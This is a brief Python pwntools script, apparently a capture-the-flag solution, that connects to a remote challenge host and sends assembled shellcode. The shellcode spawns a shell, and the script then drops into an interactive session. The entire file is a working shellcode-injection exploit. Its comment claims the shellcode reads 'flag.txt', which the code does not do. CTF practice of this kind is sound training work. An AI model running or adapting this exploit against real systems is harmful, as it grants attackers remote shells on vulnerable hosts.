from pwn import *

# Set up the binary (replace './binary' with the actual binary name)
binary = './chall'
context.binary = binary
context.log_level = 'debug'

# Connect to the process or remote server
# p = process(binary)       # Use this if running locally
p = remote('tcp.ybn.sg', 29635)  # Replace with actual remote details if needed

# Shellcode: Open, read, and print 'flag.txt' (Linux x64)

shellcode = asm(shellcraft.sh())

# Send the payload
p.send(shellcode)

# Print the flag from the output
p.interactive()

